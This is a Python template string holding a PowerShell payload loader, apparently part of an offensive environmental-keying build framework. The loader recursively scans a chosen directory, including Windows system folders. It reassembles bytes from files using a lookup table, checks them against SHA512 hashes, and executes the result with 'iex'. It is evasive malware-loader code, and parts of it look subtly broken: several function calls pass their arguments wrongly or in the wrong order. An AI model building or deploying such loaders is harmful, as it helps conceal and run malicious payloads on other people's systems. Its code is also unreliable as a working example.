buildcode="""
function Get-DecryptedString($key, $encryptedStringWithIV) {{
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    #$bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Get-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}}

function Get-CheckHash($payload, $payload_hash, $minus_bytes) {{
    $sha512 = new-Object System.Security.Cryptography.SHA512Managed
    if ([System.BitConverter]::ToString($sha512.ComputeHash([system.Text.Encoding]::UTF8.GetBytes($payload.Substring(0,$payload.Length-$minus_bytes)))).ToLower().Replace("-", "").Equals($payload_hash)) {{
        return 1
    }} Else {{
        return 0
    }}
}}

function Get-CodeExecution($payload){{
    
    iex $payload
}}

function Get-R-Done($some_file, $small_table,$full_table, $payload_hash ,$iternumhash, $minus_bytes, $scan_dir, $key_iterations){{
    $iteration_temp = $key_iterations
    "[*] Hash Iterations: " + $iteration_temp
        
    # open file
    "[*] File: " + $some_file
    try {{
        $read_file = [System.IO.File]::ReadAllBytes($some_file)
        $tLoc = 0
        $tsize = 0
        [Byte[]] $tmpstitchCheck = @()
        $itr = 0
        #WTF powershell inclusive arrays too
        while($itr -lt $small_table.Length){{
            $rLoc =  ([Byte[]] $small_table[$itr..($itr+2)]) + [Byte[]] 0x00
            $rSz =   ([Byte[]] $small_table[($itr+3)]) + [Byte[]] 0x00
            "[*] Raw Location: " + $rLoc
            "[*] Raw Size: " + $rSz
            #$rLoc.GetType()
            #$rSz.GetType()
            $tLoc = [bitconverter]::ToInt32($rLoc, 16) 
            $tsize = [bitconverter]::ToInt16($rSz, 16)
            "[*] Converted Location: " + $tLoc
            "[*] Converted Size: " + $tsize
            $tmpstitchCheck += $read_file[$tLoc..($tLoc+$tsize-1)]
            $tLoc = 0
            $tsize = 0
            $itr+= 4
        }}
        #have to get rid of the first value inserted to create the byte array holder
        $stitchCheck = $tmpstitchCheck
        #$keyvalue = $read_file[$location..($location + $key_len - 1)]
        $sha512 = new-Object System.Security.Cryptography.SHA512Managed
        
    }} Catch {{
        return 0
    }}
    
    $result = Get-CheckHash($stitchCheck, $iternumhash, $minus_bytes)

   ##################################################################
   #shoul have iterative function here, but not today
    if ($result -eq 1){{
        "[*] Short Hashes Match!"
        
            $iteration_temp = $key_iterations
        "[*] Hash Iterations: " + $iteration_temp
            
        # open file
        "[*] File: ", $some_file
        try {{
            #does it really read the entire file ???
            $read_file = [System.IO.File]::ReadAllBytes($some_file)
            #grumble: we will have to skip the first byte now :( since this fails otherwise
            [Byte[]] $tmpstitchCheck = @()
            $itr = 0
            #WTF powershell inclusive arrays too
            while($itr -lt $full_table.Length){{
                $full_table[$itr..($itr+2)]
                $full_table[($itr+3)..($itr+3)]
                $tLoc = [bitconverter]::ToInt32($full_table[$itr..($itr+2)], 0) 
                $tsize = [bitconverter]::ToInt16($full_table[($itr+3)..($itr+3)], 0)
                $tmpstitchCheck += $read_file[$tLoc..($tLoc+$tsize-1)]
                $itr+= 4
            }}
            #have to get rid of the first value inserted to create the byte array holder
            $stitchCheck = $tmpstitchCheck
            
            
        }} Catch {{
            return 0
        }}
        
        $result = Get-CheckHash($stitchCheck, $payload_hash, $minus_bytes)
        

       if ($result -eq 1){{
        "[*] Final Hashes Match"
        Get-CodeExecution $stitchCheck


        }}
    }}   
}}

function Get-Walk-OS($small_table,$full_table,$payload_hash,$iternumhash,$minus_bytes,$scan_dir,$key_iterations){{
    $dir_parsing = get-childitem $scan_dir -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    [Environment]::Is64BitProcess
    #Select-String -Pattern sysnative
    $sys_paths = @( "c:\windows", "c:\windows\system32")
    
    if ([Environment]::Is64BitProcess -eq 0 -And $sys_paths -contains $scan_dir) {{ # Is a 32bit process
        $dir_parsing += get-childitem "\Windows\sysnative" -recurse -force -ErrorAction SilentlyContinue | % {{$_.FullName}}
    }} 

    foreach ($some_file in $dir_parsing){{
        if ((Get-Item $some_file) -isnot [System.IO.DirectoryInfo] ){{
            Get-Item $some_file
            Get-R-Done $some_file $small_table $full_table $payload_hash $iternumhash $minus_bytes $scan_dir $key_iterations
        }}
    }}
}}

	$lookup_table = [System.Convert]::FromBase64String("{0}")
	$lookup_table.GetType()
	$payload_hash = "{1}"
	$iternumhash = "{2}"
    $minus_bytes = {4}
	$scan_dir = "{5}"

    #!!chaneme!
    $key_iterations = 1
	
    #$key_iterations = 
	#$location = $lookup_table[0..3]
	#[System.Array]::Reverse($location) # struct.unpack("<I", self.lookup_table[0:4])[0]
	$lookup_table[0..3]
	$location = [bitconverter]::ToInt32($lookup_table[0..3], 0)
	$key_len =  [bitconverter]::ToInt16($lookup_table[4..5], 0)
	
	#[System.Array]::Reverse($lookup_table[4..5]) # struct.unpack("<H", self.lookup_table[4:6])[0]
	"location", $location
	"key_len", $key_len
	$encrypted_msg = [System.Text.Encoding]::ASCII.GetString($lookup_table[6..$lookup_table.Length])
	#$encrypted_msg
	if ($scan_dir.Contains("%")){{
		$scan_dir = [Environment]::GetEnvironmentVariable($scan_dir -replace "%")
	}}

	Get-Walk-OS $encrypted_msg $payload_hash $minus_bytes $scan_dir $key_iterations $location $key_len


"""